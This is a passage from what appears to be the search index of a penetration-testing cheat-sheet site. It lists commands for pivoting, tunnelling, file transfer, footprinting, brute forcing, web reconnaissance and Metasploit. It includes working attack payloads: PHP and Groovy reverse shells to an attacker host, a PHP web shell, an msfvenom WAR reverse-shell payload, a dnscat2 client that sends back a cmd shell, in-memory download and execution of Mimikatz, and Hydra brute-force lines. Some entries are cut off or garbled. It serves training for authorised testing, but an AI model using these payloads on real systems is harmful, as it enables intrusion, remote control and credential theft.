run the rpivot server (<code>server.py</code>) on proxy port <code>9050</code>, server port <code>9999</code> and listening on any IP address (<code>0.0.0.0</code>).   <code>scp -r rpivot ubuntu@&lt;IPaddressOfTarget&gt;</code> Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.   <code>python2.7 client.py --server-ip 10.10.14.18 --server-port 9999</code> Used to run the rpivot client (<code>client.py</code>) to connect to the specified rpivot server on the appropriate port.   <code>proxychains firefox-esr &lt;IPaddressofTargetWebServer&gt;:80</code> Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.   <code>python client.py --server-ip &lt;IPaddressofTargetWebServer&gt; --server-port 8080 --ntlm-proxy-ip IPaddressofProxy&gt; --ntlm-proxy-port 8081 --domain &lt;nameofWindowsDomain&gt; --username &lt;username&gt; --password &lt;password&gt;</code> Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.   <code>netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25</code> Windows-based command that uses <code>netsh.exe</code> to configure a portproxy rule called <code>v4tov4</code>  that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.   <code>netsh.exe interface portproxy show v4tov4</code> Windows-based command used to view the configurations of a portproxy rule called v4tov4.   <code>git clone https://github.com/iagox86/dnscat2.git</code> Clones the <code>dnscat2</code> project GitHub repository.   <code>sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=legalcorp.local --no-cache</code> Used to start the dnscat2.rb server running on the specified IP address, port (<code>53</code>) &amp; using the domain <code>legalcorp.local</code> with the no-cache option enabled.   <code>git clone https://github.com/lukebaggett/dnscat2-powershell.git</code> Clones the dnscat2-powershell project Github repository.   <code>Import-Module dnscat2.ps1</code> PowerShell command used to import the dnscat2.ps1 tool.   <code>Start-Dnscat2 -DNSserver 10.10.14.18 -Domain legalcorp.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd</code> PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (<code>-Exec cmd</code>).   <code>dnscat2&gt; ?</code> Used to list dnscat2 options.   <code>dnscat2&gt; window -i 1</code> Used to interact with an established dnscat2 session.   <code>./chisel server -v -p 1234 --socks5</code> Used to start a chisel server in verbose mode listening on port <code>1234</code> using SOCKS version 5.   <code>./chisel client -v 10.129.202.64:1234 socks</code> Used to connect to a chisel server at the specified IP address &amp; port using socks.   <code>git clone https://github.com/utoni/ptunnel-ng.git</code> Clones the ptunnel-ng project GitHub repository.   <code>sudo ./autogen.sh</code> Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.   <code>sudo ./ptunnel-ng -r10.129.202.64 -R22</code> Used to start the ptunnel-ng server on the specified IP address (<code>-r</code>) and corresponding port (<code>-R22</code>).   <code>sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22</code> Used to connect to a specified ptunnel-ng server through local port 2222 (<code>-l2222</code>).   <code>ssh -p2222 -lubuntu 127.0.0.1</code> SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.   <code>regsvr32.exe SocksOverRDP-Plugin.dll</code> Windows-based command used to register the SocksOverRDP-PLugin.dll.   <code>netstat -antb \\|findstr 1080</code> Windows-based command used to list TCP network connections listening on port 1080.","title":"Pivoting, Tunnel, Port Forwarding"},{"location":"cheat_sheets/common_apps/","text":"Command Description     <code>sudo vim /etc/hosts</code> Opens the <code>/etc/hosts</code> with <code>vim</code> to start adding hostnames   <code>sudo nmap -p 80,443,8000,8080,8180,8888,10000 --open -oA web_discovery -iL scope_list</code> Runs an nmap scan using common web application ports based on a scope list (<code>scope_list</code>) and outputs to a file (<code>web_discovery</code>) in all formats (<code>-oA</code>)   <code>eyewitness --web -x web_discovery.xml -d &lt;nameofdirectorytobecreated&gt;</code> Runs <code>eyewitness</code> using a file generated by an nmap scan (<code>web_discovery.xml</code>) and creates a directory (<code>-d</code>)   <code>cat web_discovery.xml \\| ./aquatone -nmap</code> Concatenates the contents of nmap scan output (web_discovery.xml) and pipes it (<code>|</code>) aquatone (<code>./aquatone</code>)and ensures aquatone recognizes the file as nmap scan output (<code>-nmap</code>)   <code>sudo wpscan --url &lt;http://domainnameoripaddress&gt; --enumerate</code> Runs wpscan using the <code>--enmuerate</code> flag. Can replace the url with any valid and reachable URL in each challenge   <code>sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url &lt;http://domainnameoripaddress&gt;</code> Runs wpscan and uses it to perform a password attack (<code>--password-attack</code>) against the specified url and references a word list (<code>/usr/share/wordlists/rockyou.txt</code>)   <code>curl -s http://&lt;hostnameoripoftargetsite/path/to/webshell.php?cmd=id</code> cURL command used to execute commands (<code>cmd=id</code>) on a vulnerable system utilizing a php-based webshell   <code>&lt;?php exec(\"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;ip address of attack box&gt;/&lt;port of choice&gt; 0&gt;&amp;1'\");</code> PHP code that will execute a reverse shell on a Linux-based system   <code>droopescan scan joomla --url http://&lt;domainnameoripaddress&gt;</code> Runs <code>droopescan</code> against a joomla site located at the specified url   <code>sudo python3 joomla-brute.py -u http://dev.legalcorp.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr &lt;username or path to username list&gt;</code> Runs joomla-brute.py tool with python3 against a specified url, utilizing a specified wordlist (<code>/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt</code>) and user or list of usernames (<code>-usr</code>)   <code>&lt;?php system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']); ?&gt;</code> PHP code that will allow for web shell access on a vulnerable drupal site. Can be used through browisng to the location of the file in the web directory after saving. Can also be leveraged utilizing curl. See next command.   <code>curl -s &lt;http://domainname or IP address of site&gt; /node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id \\| grep uid \\| cut -f4 -d\"&gt;\"</code> Uses curl to navigate to php web shell file and run system commands (<code>=id</code>) on the target   <code>gobuster dir -u &lt;http://domainnameoripaddressofsite&gt; -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code> <code>gobuster</code> powered directory brute forcing attack refrencing a wordlist (<code>/usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code>)   <code>auxiliary/scanner/http/tomcat_mgr_login</code> Useful Metasploit scanner module used to perform a bruteforce login attack against a tomcat site   <code>python3 mgr_brute.py -U &lt;http://domainnameoripaddressofTomCatsite&gt; -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt</code> Runs mgr_brute.py using python3 against the specified website starts in the /manager directory (<code>-P /manager</code>) and references a specified user or userlist ( <code>-u</code>) as well as a specified password or password list (<code>-p</code>)   <code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;ip address of attack box&gt; LPORT=&lt;port to listen on to catch a shell&gt; -f war &gt; backup.war</code> Generates a jsp-based reverse shell payload in the form of a .war file utilizing <code>msfvenom</code>   <code>nmap -sV -p 8009,8080 &lt;domainname or IP address of tomcat site&gt;</code> Nmap scan useful in enumerating Apache Tomcat and AJP services   <code>r = Runtime.getRuntime() p = r.exec([\"/bin/bash\",\"-c\",\"exec 5&lt;&gt;/dev/tcp/10.10.14.15/8443;cat &lt;&amp;5 \\| while read line; do \\$line 2&gt;&amp;5 &gt;&amp;5; done\"] as String[]) p.waitFor()</code> Groovy-based reverse shell payload/code that can work with admin access to the <code>Script Console</code> of a <code>Jenkins</code> site. Will work when the underlying OS is Linux   <code>def cmd = \"cmd.exe /c dir\".execute(); println(\"${cmd.text}\");</code> Groovy-based payload/code that can work with admin access to the <code>Script Console</code> of a <code>Jenkins</code> site. This will allow webshell access and to execute commands on the underlying Windows system   <code>String host=\"localhost\"; int port=8044; String cmd=\"cmd.exe\"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new So);</code> Groovy-based reverse shell payload/code that can work with admin acess to the <code>Script Console</code> of a <code>Jenkins</code>site. Will work when the underlying OS is Windows   reverse_shell_splunk A simple Splunk package for obtaining revershells on Windows and Linux systems","title":"Common Applications"},{"location":"cheat_sheets/deobfuscation/","text":"Command Description     <code>curl http:/SERVER_IP:PORT/</code> cURL GET request   <code>curl -s http:/SERVER_IP:PORT/ -X POST</code> cURL POST request   <code>curl -s http:/SERVER_IP:PORT/ -X POST -d \"param1=sample\"</code> cURL POST request with data   <code>echo hackthebox \\| base64</code> base64 encode   <code>echo ENCODED_B64 \\| base64 -d</code> base64 decode   <code>echo hackthebox \\| xxd -p</code> hex encode   <code>echo ENCODED_HEX \\| xxd -p -r</code> hex decode   <code>echo hackthebox \\| tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 encode   <code>echo ENCODED_ROT13 \\| tr 'A-Za-z' 'N-ZA-Mn-za-m'</code> rot13 decode","title":"Commands"},{"location":"cheat_sheets/deobfuscation/#deobfuscation-websites","text":"Website     JS Console   Prettier   Beautifier   JSNice","title":"Deobfuscation Websites"},{"location":"cheat_sheets/ffuf/","text":"Command Description     <code>ffuf -h</code> ffuf help   <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ</code> Directory Fuzzing   <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/indexFUZZ</code> Extension Fuzzing   <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/blog/FUZZ.php</code> Page Fuzzing   <code>ffuf -w wordlist.txt:FUZZ -u http://SERVER_IP:PORT/FUZZ -recursion -recursion-depth 1 -e .php -v</code> Recursive Fuzzing   <code>ffuf -w wordlist.txt:FUZZ -u https://FUZZ.secops.cc/</code> Sub-domain Fuzzing   <code>ffuf -w wordlist.txt:FUZZ -u http://secops.cc:PORT/ -H 'Host: FUZZ.secops.cc' -fs xxx</code> VHost Fuzzing   <code>ffuf -w wordlist.txt:FUZZ -u http://admin.secops.cc:PORT/admin/admin.php?FUZZ=key -fs xxx</code> Parameter Fuzzing - GET   <code>ffuf -w wordlist.txt:FUZZ -u http://admin.secops.cc:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Parameter Fuzzing - POST   <code>ffuf -w ids.txt:FUZZ -u http://admin.secops.cc:PORT/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx</code> Value Fuzzing","title":"Ffuf"},{"location":"cheat_sheets/ffuf/#wordlists","text":"Command Description     <code>/opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code> Directory/Page Wordlist   <code>/opt/useful/SecLists/Discovery/Web-Content/web-extensions.txt</code> Extensions Wordlist   <code>/opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt</code> Domain Wordlist   <code>/opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt</code> Parameters Wordlist","title":"Wordlists"},{"location":"cheat_sheets/ffuf/#misc","text":"Command Description     <code>sudo sh -c 'echo \"SERVER_IP  secops.cc\" &gt;&gt; /etc/hosts'</code> Add DNS entry   <code>for i in $(seq 1 1000); do echo $i &gt;&gt; ids.txt; done</code> Create Sequence Wordlist   <code>curl http://admin.secops.cc:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'</code> curl w/ POST","title":"Misc"},{"location":"cheat_sheets/file_transfer/","text":"Command Description      <code>Invoke-WebRequest https://&lt;snip&gt;/PowerView.ps1 -OutFile PowerView.ps1</code> Download a file with PowerShell   <code>IEX (New-Object Net.WebClient).DownloadString('https://&lt;snip&gt;/Invoke-Mimikatz.ps1')</code> Execute a file in memory using PowerShell   <code>Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64</code> Upload a file with PowerShell   <code>bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe</code> Download a file using Bitsadmin   <code>certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe</code> Download a file using Certutil   <code>wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh</code> Download a file using Wget   <code>curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</code> Download a file using cURL   <code>php -r '$file = file_get_contents(\"https://&lt;snip&gt;/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'</code> Download a file using PHP   <code>scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip</code> Upload a file using SCP   <code>scp user@target:/tmp/mimikatz.exe C:\\Temp\\mimikatz.exe</code> Download a file using SCP   <code>Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"nc.exe\"</code> Invoke-WebRequest using a Chrome User Agent","title":"File Transfer"},{"location":"cheat_sheets/footprinting/","text":"","title":"Footprinting"},{"location":"cheat_sheets/footprinting/#infrastructure-based-enumeration","text":"Command Description     <code>curl -s https://crt.sh/\\?q\\=&lt;target-domain&gt;\\&amp;output\\=json \\| jq .</code> Certificate transparency.   <code>for i in $(cat ip-addresses.txt);do shodan host $i;done</code> Scan each IP address in a list using Shodan.","title":"Infrastructure-based Enumeration"},{"location":"cheat_sheets/footprinting/#host-based-enumeration","text":"","title":"Host-based Enumeration"},{"location":"cheat_sheets/footprinting/#ftp","text":"Command Description     <code>ftp &lt;FQDN/IP&gt;</code> Interact with the FTP service on the target.   <code>nc -nv &lt;FQDN/IP&gt; 21</code> Interact with the FTP service on the target.   <code>telnet &lt;FQDN/IP&gt; 21</code> Interact with the FTP service on the target.   <code>openssl s_client -connect &lt;FQDN/IP&gt;:21 -starttls ftp</code> Interact with the FTP service on the target using encrypted connection.   <code>wget -m --no-passive ftp://anonymous:anonymous@&lt;target&gt;</code> Download all available files on the target FTP server.","title":"FTP"},{"location":"cheat_sheets/footprinting/#smb","text":"Command Description     <code>smbclient -N -L //&lt;FQDN/IP&gt;</code> Null session authentication on SMB.   <code>smbclient //&lt;FQDN/IP&gt;/&lt;share&gt;</code> Connect to a specific SMB share.   <code>rpcclient -U \"\" &lt;FQDN/IP&gt;</code> Interaction with the target using RPC.   <code>samrdump.py &lt;FQDN/IP&gt;</code> Username enumeration using Impacket scripts.   <code>smbmap -H &lt;FQDN/IP&gt;</code> Enumerating SMB shares.   <code>crackmapexec smb &lt;FQDN/IP&gt; --shares -u '' -p ''</code> Enumerating SMB shares using null session authentication.   <code>enum4linux-ng.py &lt;FQDN/IP&gt; -A</code> SMB enumeration using enum4linux.","title":"SMB"},{"location":"cheat_sheets/footprinting/#nfs","text":"Command Description     <code>showmount -e &lt;FQDN/IP&gt;</code> Show available NFS shares.   <code>mount -t nfs &lt;FQDN/IP&gt;:/&lt;share&gt; ./target-NFS/ -o nolock</code> Mount the specific NFS share.umount ./target-NFS   <code>umount ./target-NFS</code> Unmount the specific NFS share.","title":"NFS"},{"location":"cheat_sheets/footprinting/#dns","text":"Command Description     <code>dig ns &lt;domain.tld&gt; @&lt;nameserver&gt;</code> NS request to the specific nameserver.   <code>dig any &lt;domain.tld&gt; @&lt;nameserver&gt;</code> ANY request to the specific nameserver.   <code>dig axfr &lt;domain.tld&gt; @&lt;nameserver&gt;</code> AXFR request to the specific nameserver.   <code>dnsenum --dnsserver &lt;nameserver&gt; --enum -p 0 -s 0 -o found_subdomains.txt -f ~/subdomains.list &lt;domain.tld&gt;</code> Subdomain brute forcing.","title":"DNS"},{"location":"cheat_sheets/footprinting/#smtp","text":"Command Description     <code>telnet &lt;FQDN/IP&gt; 25</code>","title":"SMTP"},{"location":"cheat_sheets/footprinting/#imappop3","text":"Command Description     <code>curl -k 'imaps://&lt;FQDN/IP&gt;' --user &lt;user&gt;:&lt;password&gt;</code> Log in to the IMAPS service using cURL.   <code>openssl s_client -connect &lt;FQDN/IP&gt;:imaps</code> Connect to the IMAPS service.   <code>openssl s_client -connect &lt;FQDN/IP&gt;:pop3s</code> Connect to the POP3s service.","title":"IMAP/POP3"},{"location":"cheat_sheets/footprinting/#snmp","text":"Command Description     <code>snmpwalk -v2c -c &lt;community string&gt; &lt;FQDN/IP&gt;</code> Querying OIDs using snmpwalk.   <code>onesixtyone -c community-strings.list &lt;FQDN/IP&gt;</code> Bruteforcing community strings of the SNMP service.   <code>braa &lt;community string&gt;@&lt;FQDN/IP&gt;:.1.*</code> Bruteforcing SNMP service OIDs.","title":"SNMP"},{"location":"cheat_sheets/footprinting/#mysql","text":"Command Description     <code>mysql -u &lt;user&gt; -p&lt;password&gt; &lt;FQDN/IP&gt;</code> Login to the MySQL server.","title":"MySQL"},{"location":"cheat_sheets/footprinting/#mssql","text":"Command Description     <code>mssqlclient.py &lt;user&gt;@&lt;FQDN/IP&gt; -windows-auth</code> Log in to the MSSQL server using Windows authentication.","title":"MSSQL"},{"location":"cheat_sheets/footprinting/#ipmi","text":"Command Description     <code>msf6 auxiliary(scanner/ipmi/ipmi_version)</code> IPMI version detection.   <code>msf6 auxiliary(scanner/ipmi/ipmi_dumphashes)</code> Dump IPMI hashes.","title":"IPMI"},{"location":"cheat_sheets/footprinting/#linux-remote-management","text":"Command Description     <code>ssh-audit.py &lt;FQDN/IP&gt;</code> Remote security audit against the target SSH service.   <code>ssh &lt;user&gt;@&lt;FQDN/IP&gt;</code> Log in to the SSH server using the SSH client.   <code>ssh -i private.key &lt;user&gt;@&lt;FQDN/IP&gt;</code> Log in to the SSH server using private key.   <code>ssh &lt;user&gt;@&lt;FQDN/IP&gt; -o PreferredAuthentications=password</code> Enforce password-based authentication.","title":"Linux Remote Management"},{"location":"cheat_sheets/footprinting/#windows-remote-management","text":"Command Description     <code>rdp-sec-check.pl &lt;FQDN/IP&gt;</code> Check the security settings of the RDP service.   <code>xfreerdp /u:&lt;user&gt; /p:\"&lt;password&gt;\" /v:&lt;FQDN/IP&gt;</code> Log in to the RDP server from Linux.   <code>evil-winrm -i &lt;FQDN/IP&gt; -u &lt;user&gt; -p &lt;password&gt;</code> Log in to the WinRM server.   <code>wmiexec.py &lt;user&gt;:\"&lt;password&gt;\"@&lt;FQDN/IP&gt; \"&lt;system command&gt;\"</code> Execute command using the WMI service.","title":"Windows Remote Management"},{"location":"cheat_sheets/hydra/","text":"Command Description     <code>hydra -h</code> hydra help   <code>hydra -C wordlist.txt SERVER_IP -s PORT http-get /</code> Basic Auth Brute Force - Combined Wordlist   <code>hydra -L wordlist.txt -P wordlist.txt -u -f SERVER_IP -s PORT http-get /</code> Basic Auth Brute Force - User/Pass Wordlists   <code>hydra -l admin -P wordlist.txt -f SERVER_IP -s PORT http-post-form \"/login.php:username=^USER^&amp;password=^PASS^:F=&lt;form name='login'\"</code> Login Form Brute Force - Static User, Pass Wordlist   <code>hydra -L bill.txt -P william.txt -u -f ssh://SERVER_IP:PORT -t 4</code> SSH Brute Force - User/Pass Wordlists   <code>hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1</code> FTP Brute Force - Static User, Pass Wordlist","title":"Hydra"},{"location":"cheat_sheets/hydra/#wordlists","text":"Command Description     <code>/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt</code> Default Passwords Wordlist   <code>/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt</code> Common Passwords Wordlist   <code>/opt/useful/SecLists/Usernames/Names/names.txt</code> Common Names Wordlist","title":"Wordlists"},{"location":"cheat_sheets/hydra/#misc","text":"Command Description     <code>cupp -i</code> Creating Custom Password Wordlist   <code>sed -ri '/^.{,7}$/d' william.txt</code> Remove Passwords Shorter Than 8   <code>sed -ri '/[!-/:-@\\[-`\\{-~]+/!d' william.txt</code> Remove Passwords With No Special Chars   <code>sed -ri '/[0-9]+/!d' william.txt</code> Remove Passwords With No Numbers   <code>./username-anarchy Bill Gates &gt; bill.txt</code> Generate Usernames List   <code>ssh b.gates@SERVER_IP -p PORT</code> SSH to Server   <code>ftp 127.0.0.1</code> FTP to Server   <code>su - user</code> Switch to User","title":"Misc"},{"location":"cheat_sheets/info_gathering_web/","text":"","title":"Information Gathering - Web"},{"location":"cheat_sheets/info_gathering_web/#whois","text":"Command Description     <code>export TARGET=\"domain.tld\"</code> Assign target to an environment variable.   <code>whois $TARGET</code> WHOIS lookup for the target.","title":"WHOIS"},{"location":"cheat_sheets/info_gathering_web/#dns-enumeration","text":"Command Description     <code>nslookup $TARGET</code> Identify the <code>A</code> record for the target domain.   <code>nslookup -query=A $TARGET</code> Identify the <code>A</code> record for the target domain.   <code>dig $TARGET @&lt;nameserver/IP&gt;</code> Identify the <code>A</code> record for the target domain.   <code>dig a $TARGET @&lt;nameserver/IP&gt;</code> Identify the <code>A</code> record for the target domain.   <code>nslookup -query=PTR &lt;IP&gt;</code> Identify the <code>PTR</code> record for the target IP address.   <code>dig -x &lt;IP&gt; @&lt;nameserver/IP&gt;</code> Identify the <code>PTR</code> record for the target IP address.   <code>nslookup -query=ANY $TARGET</code> Identify <code>ANY</code> records for the target domain.   <code>dig any $TARGET @&lt;nameserver/IP&gt;</code> Identify <code>ANY</code> records for the target domain.   <code>nslookup -query=TXT $TARGET</code> Identify the <code>TXT</code> records for the target domain.   <code>dig txt $TARGET @&lt;nameserver/IP&gt;</code> Identify the <code>TXT</code> records for the target domain.   <code>nslookup -query=MX $TARGET</code> Identify the <code>MX</code> records for the target domain.   <code>dig mx $TARGET @&lt;nameserver/IP&gt;</code> Identify the <code>MX</code> records for the target domain.","title":"DNS Enumeration"},{"location":"cheat_sheets/info_gathering_web/#passive-subdomain-enumeration","text":"Resource/Command Description     <code>VirusTotal</code> https://www.virustotal.com/gui/home/url   <code>Censys</code> https://censys.io/   <code>Crt.sh</code> https://crt.sh/   <code>curl -s https://sonar.omnisint.io/subdomains/{domain} \\| jq -r '.[]' \\| sort -u</code> All subdomains for a given domain.   <code>curl -s https://sonar.omnisint.io/tlds/{domain} \\| jq -r '.[]' \\| sort -u</code> All TLDs found for a given domain.   <code>curl -s https://sonar.omnisint.io/all/{domain} \\| jq -r '.[]' \\| sort -u</code> All results across all TLDs for a given domain.   <code>curl -s https://sonar.omnisint.io/reverse/{ip} \\| jq -r '.[]' \\| sort -u</code> Reverse DNS lookup on IP address.   <code>curl -s https://sonar.omnisint.io/reverse/{ip}/{mask} \\| jq -r '.[]' \\| sort -u</code> Reverse DNS lookup of a CIDR range.   <code>curl -s \"https://crt.sh/?q=${TARGET}&amp;output=json\" \\| jq -r '.[] \\| \"\\(.name_value)\\n\\(.common_name)\"' \\| sort -u</code> Certificate Transparency.   <code>cat sources.txt \\| while read source; do theHarvester -d \"${TARGET}\" -b $source -f \"${source}-${TARGET}\";done</code> Searching for subdomains and other information on the sources provided in the source.txt list.","title":"Passive Subdomain Enumeration"},{"location":"cheat_sheets/info_gathering_web/#sourcestxt","text":"<pre><code>baidu\nbufferoverun\ncrtsh\nhackertarget\notx\nprojecdiscovery\nrapiddns\nsublist3r\nthreatcrowd\ntrello\nurlscan\nvhost\nvirustotal\nzoomeye\n</code></pre>","title":"Sources.txt"},{"location":"cheat_sheets/info_gathering_web/#passive-infrastructure-identification","text":"Resource/Command Description     <code>Netcraft</code> https://www.netcraft.com/   <code>WayBackMachine</code> http://web.archive.org/   <code>WayBackURLs</code> https://github.com/tomnomnom/waybackurls   <code>waybackurls -dates https://$TARGET &gt; waybackurls.txt</code> Crawling URLs from a domain with the date it was obtained.","title":"Passive Infrastructure Identification"},{"location":"cheat_sheets/info_gathering_web/#active-infrastructure-identification","text":"Resource/Command Description     <code>curl -I \"http://${TARGET}\"</code> Display HTTP headers of the target webserver.   <code>whatweb -a https://www.facebook.com -v</code> Technology identification.   <code>Wappalyzer</code> https://www.wappalyzer.com/   <code>wafw00f -v https://$TARGET</code> WAF Fingerprinting.   <code>Aquatone</code> https://github.com/michenriksen/aquatone   <code>cat subdomain.list \\| aquatone -out ./aquatone -screenshot-timeout 1000</code> Makes screenshots of all subdomains in the subdomain.list.","title":"Active Infrastructure Identification"},{"location":"cheat_sheets/info_gathering_web/#active-subdomain-enumeration","text":"Resource/Command Description     <code>HackerTarget</code> https://hackertarget.com/zone-transfer/   <code>SecLists</code> https://github.com/danielmiessler/SecLists   <code>nslookup -type=any -query=AXFR $TARGET nameserver.target.domain</code> Zone Transfer using Nslookup against the target domain and its nameserver.   <code>gobuster dns -q -r \"${NS}\" -d \"${TARGET}\" -w \"${WORDLIST}\" -p ./patterns.txt -o \"gobuster_${TARGET}.txt\"</code> Bruteforcing subdomains.","title":"Active Subdomain Enumeration"},{"location":"cheat_sheets/info_gathering_web/#virtual-hosts","text":"Resource/Command Description     <code>curl -s http://192.168.10.10 -H \"Host: randomtarget.com\"</code> Changing the HOST HTTP header to request a specific domain.   <code>cat ./vhosts.list \\| while read vhost;do echo \"\\n********\\nFUZZING: ${vhost}\\n********\";curl -s -I http://&lt;IP address&gt; -H \"HOST: ${vhost}.target.domain\" \\| grep \"Content-Length: \";done</code> Bruteforcing for possible virtual hosts on the target domain.   <code>ffuf -w ./vhosts -u http://&lt;IP address&gt; -H \"HOST: FUZZ.target.domain\" -fs 612</code> Bruteforcing for possible virtual hosts on the target domain using <code>ffuf</code>.","title":"Virtual Hosts"},{"location":"cheat_sheets/info_gathering_web/#crawling","text":"Resource/Command Description     <code>ZAP</code> https://www.zaproxy.org/   <code>ffuf -recursion -recursion-depth 1 -u http://192.168.10.10/FUZZ -w /opt/useful/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt</code> Discovering files and folders that cannot be spotted by browsing the website.   <code>ffuf -w ./folders.txt:FOLDERS,./wordlist.txt:WORDLIST,./extensions.txt:EXTENSIONS -u http://www.target.domain/FOLDERS/WORDLISTEXTENSIONS</code> Mutated bruteforcing against the target web server.","title":"Crawling"},{"location":"cheat_sheets/linux_shortcuts/","text":"Cursor Movement <p><code>[CTRL] + A</code> - Move the cursor to the <code>beginning</code> of the current line.</p> <p><code>[CTRL] + E</code> - Move the cursor to the <code>end</code> of the current line.</p> <p><code>[CTRL] + [\u2190]</code> / <code>[\u2192]</code> - Jump at the beginning of the current/previous word.</p> <p><code>[ALT] + B</code> / <code>F</code> - Jump backward/forward one word.</p>  Erase The Current Line <p><code>[CTRL] + U</code> - Erase everything from the current position of the cursor to the <code>beginning</code> of the line.</p> <p><code>[Ctrl] + K</code> - Erase everything from the current position of the cursor to the <code>end</code> of the line.</p> <p><code>[Ctrl] + W</code> - Erase the word preceding the cursor position.</p>  Paste Erased Contents <p><code>[Ctrl] + Y</code> - Pastes the erased text or word.</p>  Ends Task <p><code>[CTRL] + C</code> - Ends the current task/process by sending the <code>SIGINT</code> signal. For example, this can be a scan that is running by a tool. If we are watching the scan, we can stop it / kill this process by using this shortcut. While not configured and developed by the tool we are using. The process will be killed without asking us for confirmation.</p>  End-of-File (EOF) <p><code>[CTRL] + D</code> - Close <code>STDIN</code> pipe that is also known as End-of-File (EOF) or End-of-Transmission.</p>  Clear Terminal <p><code>[CTRL] + L</code> - Clears the terminal. An alternative to this shortcut is the <code>clear</code> command you can type to clear our terminal.</p>  Background a Process <p><code>[CTRL] + Z</code> - Suspend the current process by sending the <code>SIGTSTP</code> signal.</p>  Search Through Command History <p><code>[CTRL] + R</code> - Search through command history for commands we typed previously that match our search patterns.</p> <p><code>[\u2191]</code> / <code>[\u2193]</code> - Go to the previous/next command in the command history.</p>  Switch Between Applications <p><code>[ALT] + [TAB]</code> - Switch between opened applications.</p>  Zoom <p><code>[CTRL] + [+]</code> - Zoom in.</p> <p><code>[CTRL] + [-]</code> - Zoom out.</p>","title":"Linux Shortcuts"},{"location":"cheat_sheets/msf/","text":"","title":"MSF"},{"location":"cheat_sheets/msf/#msfconsole-commands","text":"Command Description     <code>show exploits</code> Show all exploits within the Framework.   <code>show payloads</code> Show all payloads within the Framework.   <code>show auxiliary</code> Show all auxiliary modules within the Framework.   <code>search &lt;name&gt;</code> Search for exploits or modules within the Framework.   <code>info</code> Load information about a specific exploit or module.   <code>use &lt;name&gt;</code> Load an exploit or module (example: use windows/smb/psexec).   <code>use &lt;number&gt;</code> Load an exploit by using the index number displayed after the search  command.   <code>LHOST</code> Your local host\u2019s IP address reachable by the target, often the public IP address when not on a local network. Typically used for reverse shells.   <code>RHOST</code> The remote host or the target. set function Set a specific value (for example, LHOST or RHOST).   <code>setg &lt;function&gt;</code> Set a specific value globally (for example, LHOST or RHOST).   <code>show options</code> Show the options available for a module or exploit.   <code>show targets</code> Show the platforms supported by the exploit.   <code>set target &lt;number&gt;</code> Specify a specific target index if you know the OS and service pack.   <code>set payload &lt;payload&gt;</code> Specify the payload to use.   <code>set payload &lt;number&gt;</code> Specify the payload index number to use after the show payloads command.   <code>show advanced</code> Show advanced options.   <code>set autorunscript migrate -f</code> Automatically migrate to a separate process upon exploit completion.   <code>check</code> Determine whether a target is vulnerable to an attack.   <code>exploit</code> Execute the module or exploit and attack the target.   <code>exploit -j</code> Run the exploit under the context of the job. (This will run the exploit in the background.)   <code>exploit -z</code> Do not interact with the session after successful exploitation.   <code>exploit -e &lt;encoder&gt;</code> Specify the payload encoder to use (example: exploit \u2013e shikata_ga_nai).   <code>exploit -h</code> Display help for the exploit command.   <code>sessions -l</code> List available sessions (used when handling multiple shells).   <code>sessions -l -v</code> List all available sessions and show verbose fields, such as which vulnerability was used when exploiting the system.   <code>sessions -s &lt;script&gt;</code> Run a specific Meterpreter script on all Meterpreter live sessions.   <code>sessions -K</code> Kill all live sessions.   <code>sessions -c &lt;cmd&gt;</code> Execute a command on all live Meterpreter sessions.   <code>sessions -u &lt;sessionID&gt;</code> Upgrade a normal Win32 shell to a 